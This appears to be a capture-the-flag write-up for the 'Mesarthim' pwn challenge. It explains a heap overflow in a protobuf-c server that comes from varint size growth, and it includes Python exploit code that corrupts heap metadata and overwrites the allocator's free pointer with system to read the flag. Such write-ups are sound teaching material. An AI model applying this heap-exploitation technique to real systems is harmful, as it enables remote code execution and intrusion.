Author: 0x6fe1be2
Version: 03-11-2025

# ARIES - Mesarthim


Status: Unsolved

Category: PWN, SPACE

Points: 500 (0 Solves)

Description:

> Our advanced Mesarthim satellite platform delivers powerful computing capabilities in orbit.
> 
> Mesarthim (Mission Systems Architecture for Real-Time Handling and Integration Management) provides the robust processing power needed for complex space missions, from scientific data analysis to autonomous decision-making. Built on proven computing 
> architecture, our satellites handle demanding 
> workloads while maintaining reliable communication 
> with ground stations.
> 
> Engineered for long-duration missions with redundant systems and fault tolerance, Mesarthim satellites operate autonomously when needed and respond instantly to ground commands when required.
> 
> Experience the reliability of space-proven technology designed to keep your missions running smoothly, day after day, orbit after orbit.



## TL;DR 

Mesarthim is the third and final stage of the ARIES challenge. It requires exploiting a x86_64 protobuf binary which introduced a small heap BOF using the size changes between protobuf variable length integers. We can exploit this vulnerability by adding new entries in the the existing protobuf structure. This allows us to do arbitrary heap allocation, with arbitrary data and finally achieve RCE. Due to being a space challenge the entire payload must be send at once without interactive responses. Preventing us from getting any meaningful leaks.


## Files

We are given the following files:

```
attachments/
├── Dockerfile
├── docker-compose.yml
├── files
│   └── input
├── share
│   ├── mesarthim
│   ├── mesarthim_deploy
│   └── run.sh
└── src
    ├── mesarthim.c
    ├── mesarthim.proto
    ├── mesarthim_client.c
    └── mesarthim_deploy.c
```

Lets go over the most important ones:

First let's look at the *Dockerfile* and it is rather simple we execute *run.sh* in a very simple container `/opt/mesarthim`. The run.sh script simply store the flag in the `/opt/mesarthim` and runs `exec ./mesarthim_deploy < /files/input > /files/output`.

[*Dockerfile*](https://gfelber.dev/writeups/res/mesarthim/Dockerfile) [*run.sh*](https://gfelber.dev/writeups/res/mesarthim/run.sh)

Ok next let's take a look at the sources files for *mesarthim_deploy.c* first. It basically just executes `mesarthim`, reads the input file `/files/input` from stdin, sends it to `mesarthim` and writes the output to stdout aka `/files/output`. Because this is a space challenge we will have to send our entire exploit through one input and only receive one output. This means that we won't be able to get any ASLR leaks (that are meaningful).

[*mesarthim_deploy.c*](https://gfelber.dev/writeups/res/mesarthim/mesarthim_deploy.c)

The actual challenge seems to be *mesarthim.c*, which implements a simple TCP server which accepts frames, that defined through *mesarthim.proto*. It executes the corresponding command and finally sends a response. Also multiple frames can be send through one connection.

[*mesarthim.c*](https://gfelber.dev/writeups/res/mesarthim/mesarthim.c) [*mesarthim.proto*](https://gfelber.dev/writeups/res/mesarthim/mesarthim.proto)

Also one important thing to note is that the binary actually is not a PIE (Position Independent Executable) and static which should make exploitation easier. 

```
$ vagd info share/mesarthim
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
Comment:    GCC: (Debian 14.2.0-19) 14.2.0
```

Last we have the *mesarthim_client.c*. This actually is never used inside the challenge, but it showcases how one could interact with the mesarthim challenge.

[*mesarthim_client.c*](https://gfelber.dev/writeups/res/mesarthim/mesarthim_client.c)


## Vulnerability

The main vulnerability of this challenges happens due to the nature of variable size integers. Notably the Frame size `int32 size  = 1;` and `Commands cmd = 2;` (`enum Commands`) are stored in `int32` attributes. Which are actually really inefficient at storing negative values (even google is aware of that): 

| Proto Type | Notes      |
| ---------- | ---------- |
| int32      | Uses variable-length encoding. Inefficient for encoding negative numbers – if your field is likely to have negative values, use sint32 instead. |

-- <cite> [Scalar Value Types](https://protobuf.dev/programming-guides/proto3/#scalar) </cite>

How inefficient? It actually requires [10 Bytes](https://github.com/protobuf-c/protobuf-c/blob/master/protobuf-c/protobuf-c.c#L293) for a 32 bit integer!

So how can we exploit this? Well this is where we target the `ERROR = -1;` enum that is set if we make an invalid request. 

```c
  default:
    printf("Unknown command: %d\n", frame->cmd);
    return MAIN__COMMANDS__ERROR;
```

This will make the size of our frame explode. Additionally the way we set `response->size` is actually unsafe, because setting a size that is larger then the previous one can actual cause the packed size to increase after setting it. 

```c
Main__Frame *make_response_frame(Main__Frame *response, Main__Commands cmd) {

  response->cmd = cmd;

  if (cmd == MAIN__COMMANDS__STATUS) {
    update_status();
    response->status = &g_status;
  }

  // Calculate size
  response->size = main__frame__get_packed_size(response);

  return response;
}
```

This is an issue, because there is no size argument in the `main__frame__pack` function. Which means this can lead to a heap buffer overflow.
```c
      uint8_t *frame_buffer = malloc(frame->size);

      if (frame_buffer) {
        size_t packed_len = main__frame__pack(frame, frame_buffer);
```

That is also why the client actually calculates the size like this:
```c
  // Calculate size
  int32_t size;
  while (frame->size != (size = main__frame__get_packed_size(frame)))
    frame->size = size;
```

Note: During the CTF another unintended vulnerability was discovered. Basically it is possible to integer underflow `header->size - bytes_received` to get a massive heap overflow, but due to the follow up check `bytes_received != header->size` which closes the connection. It is probably not easily possible to exploit this vulnerability.

### Protobuf `bytes fun = 4`

Next comes an interesting features of protobuf, it actually allows you to add new attributes or modify them and stay backward compatible (if done correctly). This allows use to changes the type of `Status.name` to bytes so we can e.g. build a fake heap header (without running into invalid utf-8 encoding issues).

```proto
message Status {
  // use bytes to avoid string encoding issues
  bytes name = 1;
```

Additionally We can just add new attributes, whereas libprotobuf-c actually allocates var size types (likes `bytes` or `string` ) on the heap!

```proto
message Frame {
  int32 size  = 1;
  Commands cmd = 2;
  Status status = 3;
  // add a new attribute
  repeated bytes spray = 4;
}
```

[*mesarthim.proto*](https://gfelber.dev/writeups/res/mesarthim/mesarthim.proto)

So now we have our vulnerability (heap BOF) and the ability to do arbitrary heap allocations, that are freed afterwards!

Also another nice thing is that libprotobuf-c is that it internally uses the `static ProtobufCAllocator protobuf_c__allocator` for making heap allocation which is actually mutable.

```c
/*
 * This allocator uses the system's malloc() and free(). It is the default
 * allocator used if NULL is passed as the ProtobufCAllocator to an exported
 * function.
 */
static ProtobufCAllocator protobuf_c__allocator = {
	.alloc = &system_alloc,
	.free = &system_free,
	.allocator_data = NULL,
};
```

and what is even better for us that it is right after our global `g_name` struct:
```
00:0000│  0x4e8110 (g_name) ◂— 'mesarthim'
01:0008│  0x4e8118 (g_name+8) ◂— 0x6d /* 'm' */
02:0010│  0x4e8120 (g_status) —▸ 0x4e3260 (main.status.descriptor) ◂— 0x28aaeef9
03:0018│  0x4e8128 (g_status+8) ◂— 0
04:0020│  0x4e8130 (g_status+16) ◂— 0
05:0028│  0x4e8138 (g_status+24) —▸ 0x4e8110 (g_name) ◂— 'mesarthim'
06:0030│  0x4e8140 (g_status+32) ◂— 0
... ↓     2 skipped
09:0048│  0x4e8158 (g_status+56) —▸ 0x4e8160 (g_telemetry) —▸ 0x4e3020 (main.telemetry.descriptor) ◂— 0x28aaeef9
0a:0050│  0x4e8160 (g_telemetry) —▸ 0x4e3020 (main.telemetry.descriptor) ◂— 0x28aaeef9
0b:0058│  0x4e8168 (g_telemetry+8) ◂— 0
0c:0060│  0x4e8170 (g_telemetry+16) ◂— 0
0d:0068│  0x4e8178 (g_telemetry+24) ◂— 0x408d712b4250df6a
0e:0070│  0x4e8180 (g_telemetry+32) ◂— 0x40f9999a00086470
0f:0078│  0x4e8188 (g_telemetry+40) ◂— 0x42c0999a42540000
10:0080│  0x4e8190 (protobuf_c.allocator) —▸ 0x402490 (system_alloc) ◂— endbr64 
11:0088│  0x4e8198 (protobuf_c.allocator+8) —▸ 0x402480 (system_free) ◂— endbr64 
12:0090│  0x4e81a0 (protobuf_c.allocator+16) ◂— 0

```


## Exploitation

Let's define the following helpers, which will enable us to interact to trigger the buffer overflow, send frames to some heap allocation utilities

```python
inpt_file = open('input', 'wb')

def send_frame(frame):
  assert frame.size == frame.ByteSize()
  # linfo(f"Sending  frame: {frame.size:#04x}")
  frame_buf = bytearray(frame.SerializeToString())
  # linfo(f"Raw:\n{hexdump(frame_buf)}")
  se(frame_buf)
  inpt_file.write(frame_buf)

def send_frame_buf(buf, cmd=mesarthim_pb2.Commands.PING):
  frame = mesarthim_pb2.Frame()
  frame.cmd = cmd
  frame.status.name = buf

  frame.size = frame.ByteSize()
  frame.size = frame.ByteSize()
  frame.size = frame.ByteSize()

  send_frame(frame)


def send_frame_sz(size):
  send_frame_buf(cyc(size-0x8))

def send_crpt(sz):
  send_frame_buf(cyc(0x76) + p8(sz), 8)

def send_spray(buf, sprays):
  frame = mesarthim_pb2.Frame()
  frame.cmd = mesarthim_pb2.Commands.PING
  frame.status.name = buf
  for s in sprays:
    frame.spray.append(s)
  frame.size = frame.ByteSize()
  frame.size = frame.ByteSize()
  frame.size = frame.ByteSize()
  send_frame(frame)
```

We will use the following exploitation path:
1. create a fake valid heap chunk in the above `protobuf_c.allocator`
2. corrupt the size of a freed heap chunk
3. realloc into the chunk and free it (to get the bigger BOF)
4. corrupt heap ptrs in follow up chunks to get arb unlink
5. realloc into the arb unlink to corrupt `protobuf_c.allocator`
6. trigger RCE on unlink

```python

# 1. create a fake valid heap chunk in the above protobuf_c.allocator
fake = flat({
  8: 0x101,
}, filler=b"A", length=0x78)

send_frame_buf(fake, mesarthim_pb2.Commands.SET_NAME)

# 2. corrupt the size of a freed heap chunk
send_frame_sz(0x78)
send_crpt(0xd1)

# 3. realloc into the chunk and free it
send_spray(cyc(0x80), [cyc(0x80)]*2)

# 4. corrupt heap ptrs in follow up chunks to get arb unlink
crpt = flat({
  cfd('abfa'): [
    0x81,
    0x200000004,
    2,
    exe.sym.g_name+0x10
  ]
}, filler=b"A", length=0xc0)

send_spray(cyc(0x70), [crpt] + [p8(i) for i in range(3)] + [cyc(0x40)])

# 5. realloc into the arb unlink to corrupt protobuf_c.allocator
rce = flat({
  0: 'cat flag >&4\0',
  cfd('abda'): [
    0x6fe1be2,       # alloc
    exe.sym.__libc_system, # free
    exe.sym.g_name + 0x12, # rdi
  ]
}, filler=b"A", length=0xf0)

send_spray(b'', [rce])
# 6. trigger RCE on unlink

t.shutdown('send')
print(ra())
inpt_file.close()
```

Also note that we use `cat flag >&4` to read the flag directly into the open socket file descriptor

# Final

[*exploit.py*](https://gfelber.dev/writeups/res/mesarthim/exploit.py)


Flag: `space{pr0t0buf_wh3re_u_le4st_exp3ct_It_d8e84088d8497e6a}`
